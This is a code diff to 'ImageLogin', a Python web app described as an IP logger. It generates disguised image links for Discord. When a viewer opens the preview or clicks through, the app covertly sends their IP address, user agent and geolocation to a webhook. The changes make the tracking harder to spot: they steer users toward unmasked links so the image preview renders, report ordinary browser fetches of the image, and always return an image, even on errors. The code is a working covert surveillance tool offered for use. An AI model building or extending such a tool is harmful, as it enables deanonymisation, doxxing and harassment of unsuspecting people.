@@ -1,5 +1,6 @@
 from urllib import parse
 import base64
+import json
 import os
 import traceback
 import zlib
@@ -9,7 +10,7 @@ import requests
 
 __app__ = "ImageLogin"
 __description__ = "IP Logger"
-__version__ = "v5.0"
+__version__ = "v5.1"
 __author__ = "YonyLogger"
 
 config = {
@@ -41,7 +42,7 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164")
 
-API_TIMEOUT = 5
+API_TIMEOUT = 2
 REASONS = {
     200: "OK",
     204: "No Content",
@@ -78,7 +79,6 @@ button.ghost:hover{border-color:#c8102e;color:#fff}
 .presets figcaption{font-size:10px;color:#5d5e63;margin-top:5px;letter-spacing:.05em}
 .note{margin-top:24px;font-size:11px;color:#5d5e63;line-height:1.8}
 b{color:#9a9ba0;font-weight:400}
-a{color:#c8102e;text-decoration:none}
 </style></head>
 <body><div class="wrap">
 <h1>ImageLogin</h1>
@@ -91,14 +91,10 @@ a{color:#c8102e;text-decoration:none}
 <div class="out" id="out">
 <div class="field">
 <input id="res" readonly onclick="this.select()">
-<button class="ghost" onclick="copy('res')">Copier</button>
+<button class="ghost" onclick="copy()">Copier</button>
 </div>
-<div class="row">
-<button class="ghost" onclick="copy('mask')">Copier en masqué</button>
-</div>
-<input id="mask" type="hidden">
-<p class="note"><b>Lien direct</b> : Discord affiche l'aperçu, c'est celui à coller.<br>
-<b>Lien masqué</b> : texte cliquable propre, mais Discord ne génère pas d'aperçu dessus.</p>
+<p class="note"><b>Colle ce lien tel quel</b> dans Discord : l'image s'affiche en aperçu.<br>
+Ne le mets pas en forme masquée, Discord n'affiche alors aucune image.</p>
 </div>
 <p class="note">Ouvre l'aperçu puis clique dessus : l'IP part sur le webhook.</p>
 </div>
@@ -110,20 +106,15 @@ function gen(){
   document.getElementById("res").value=location.origin+"/"+enc(u)+".png";
   document.getElementById("out").classList.add("on");
 }
-function preset(i,name,url){
-  document.getElementById("src").value=url;
+function preset(i){
+  document.getElementById("src").value=document.querySelectorAll(".presets img")[i].dataset.url;
   document.getElementById("res").value=location.origin+"/p"+i+".png";
-  document.getElementById("mask").value="["+name+"]("+location.origin+"/p"+i+".png)";
   document.getElementById("out").classList.add("on");
 }
-function copy(id){
-  var el=document.getElementById(id);
-  if(id==="mask"){
-    var name=document.getElementById("src").value.split("/").pop().split("?")[0]||"image";
-    el.value="["+name+"]("+document.getElementById("res").value+")";
-  }
+function copy(){
   var t=document.createElement("textarea");
-  t.value=el.value;document.body.appendChild(t);t.select();document.execCommand("copy");
+  t.value=document.getElementById("res").value;
+  document.body.appendChild(t);t.select();document.execCommand("copy");
   document.body.removeChild(t);
 }
 </script></body></html>"""
@@ -134,6 +125,8 @@ VIEW = """<!doctype html>
 <meta property="og:type" content="website">
 <meta property="og:title" content="__TITLE__">
 <meta property="og:image" content="__URL__">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="1200">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="__URL__">
 <title>__TITLE__</title>
@@ -171,15 +164,27 @@ def post(payload):
 
 def isBot(ip, useragent):
     useragent = useragent or ""
+    lowered = useragent.lower()
     if ip and ip.startswith(("34", "35")):
         return "Discord"
-    if useragent.startswith("TelegramBot"):
-        return "Telegram"
-    lowered = useragent.lower()
     if "discordbot" in lowered:
         return "Discord"
-    if "bot" in lowered or "crawler" in lowered or "spider" in lowered:
+    if "telegrambot" in lowered:
+        return "Telegram"
+    if "bot" in lowered or "crawler" in lowered or "spider" in lowered or "preview" in lowered:
         return "Crawler"
+    return False
+
+
+def wantsImage(environ, bot):
+    if bot:
+        return True
+    accept = (environ.get("HTTP_ACCEPT") or "").lower()
+    if "text/html" not in accept:
+        return True
+    purpose = (environ.get("HTTP_SEC_FETCH_DEST") or "").lower()
+    if purpose in ("image", "empty"):
+        return True
     return False
 
 
@@ -232,18 +237,18 @@ def resolve(token):
     return decodeToken(token) or config["image"]
 
 
-def respond(start_response, code, content_type, body, extra=None):
+def respond(start_response, code, content_type, body, extra=None, head=False):
     headers = [
         ("Content-Type", content_type),
         ("Content-Length", str(len(body))),
         ("Cache-Control", "no-store, max-age=0"),
         ("Access-Control-Allow-Origin", "*"),
-        ("Vary", "User-Agent"),
+        ("Vary", "User-Agent, Accept"),
     ]
     if extra:
         headers.extend(extra.items())
     start_response(f"{code} {REASONS.get(code, 'OK')}", headers)
-    return [body]
+    return [b""] if head else [body]
 
 
 def reportError(error):
@@ -258,7 +263,7 @@ def reportError(error):
     })
 
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, light=False):
     bot = isBot(ip, useragent)
 
     if bot:
@@ -279,7 +284,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         return None
 
     ping = "@everyone"
-    info = fetchGeo(ip) if ip else {}
+    info = {} if light else (fetchGeo(ip) if ip else {})
 
     if info.get("proxy"):
         if config["vpnCheck"] == 2:
@@ -351,7 +356,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
 def generatorPage():
     presets = "".join(
-        f'<figure><img src="{p["url"]}" onclick="preset({i}, \'{p["name"]}\', \'{p["url"]}\')" alt="">'
+        f'<figure><img src="{p["url"]}" data-url="{p["url"]}" onclick="preset({i})" alt="">'
         f'<figcaption>{p["name"]}</figcaption></figure>'
         for i, p in enumerate(config["presets"])
     )
@@ -374,27 +379,39 @@ def app(environ, start_response):
         name = path.strip("/")
         ip = clientIP(environ)
         useragent = environ.get("HTTP_USER_AGENT") or ""
+        head = method == "HEAD"
+
+        if query.get("debug"):
+            payload = {
+                "ip": ip,
+                "user_agent": useragent,
+                "accept": environ.get("HTTP_ACCEPT"),
+                "bot": isBot(ip, useragent),
+                "image": wantsImage(environ, isBot(ip, useragent)),
+                "path": path,
+            }
+            return respond(start_response, 200, "application/json", json.dumps(payload, indent=2).encode(), head=head)
 
         if name in ("", "index.html", "api", "api/index", "api/index.py"):
             if query.get("url"):
                 target = f"{origin(environ)}/{encodeToken(query['url'])}.png"
-                return respond(start_response, 302, "text/html", b"", {"Location": target})
-            if method == "HEAD":
-                return respond(start_response, 200, "text/html; charset=utf-8", b"")
-            return respond(start_response, 200, "text/html; charset=utf-8", generatorPage())
+                return respond(start_response, 302, "text/html", b"", {"Location": target}, head=head)
+            return respond(start_response, 200, "text/html; charset=utf-8", generatorPage(), head=head)
 
         if name.startswith(("favicon", "robots.txt")):
-            return respond(start_response, 204, "text/plain", b"")
+            return respond(start_response, 204, "text/plain", b"", head=head)
 
         token = name[:-4] if name.lower().endswith(".png") else name
         url = resolve(token)
         bot = isBot(ip, useragent)
+        image_client = wantsImage(environ, bot)
+        extra = {"Content-Disposition": 'inline; filename="image.png"'}
 
-        if bot:
-            makeReport(ip, endpoint=path, url=url)
+        if image_client:
+            makeReport(ip, useragent, endpoint=path, url=url, light=not bot)
             if config["buggedImage"]:
-                return respond(start_response, 200, "image/png", LOADING)
-            return respond(start_response, 302, "image/png", b"", {"Location": url})
+                return respond(start_response, 200, "image/png", LOADING, extra, head=head)
+            return respond(start_response, 302, "image/png", b"", {"Location": url}, head=head)
 
         location = None
         if query.get("g") and config["accurateLocation"]:
@@ -406,7 +423,7 @@ def app(environ, start_response):
         result = makeReport(ip, useragent, location, path, url=url)
 
         if config["redirect"]["redirect"]:
-            return respond(start_response, 302, "text/html", b"", {"Location": config["redirect"]["page"]})
+            return respond(start_response, 302, "text/html", b"", {"Location": config["redirect"]["page"]}, head=head)
 
         message = config["message"]["message"]
         if config["message"]["richMessage"] and result:
@@ -441,13 +458,12 @@ def app(environ, start_response):
         if config["accurateLocation"]:
             body += LOCATION_SCRIPT
 
-        if method == "HEAD":
-            return respond(start_response, 200, "text/html; charset=utf-8", b"")
-
-        return respond(start_response, 200, "text/html; charset=utf-8", body)
+        return respond(start_response, 200, "text/html; charset=utf-8", body, head=head)
 
     except Exception:
         reportError(traceback.format_exc())
+        if (environ.get("PATH_INFO") or "").lower().endswith(".png"):
+            return respond(start_response, 200, "image/png", LOADING)
         return respond(
             start_response,
             500,
